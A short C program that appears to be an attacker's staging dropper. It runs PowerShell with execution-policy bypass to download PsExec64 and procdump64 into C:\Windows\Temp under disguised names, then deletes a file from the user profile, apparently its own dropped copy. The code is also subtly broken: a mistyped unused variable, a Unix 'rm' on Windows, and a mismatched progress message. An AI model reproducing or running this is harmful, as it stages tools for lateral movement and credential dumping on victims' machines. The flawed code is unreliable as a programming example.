#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int c, char *argv[]){
	char path = "C:\\Windows\\Temp";

	printf("exe executed, downloading pe.exe\n");
	system("powershell -exec bypass -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/PsExec64.exe','C:\\Windows\\Temp\\pe.exe')) } \"");
	printf("ps.exe downloaded, downloading pd.exe\n");
	system("powershell -exec bypass -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/procdump64.exe','C:\\Windows\\Temp\\pd.exe')) } \"");
	printf("pd.exe downloaded");


	getchar();
	system("rm %USERPROFILE%\\d.exe");
	return 0;
}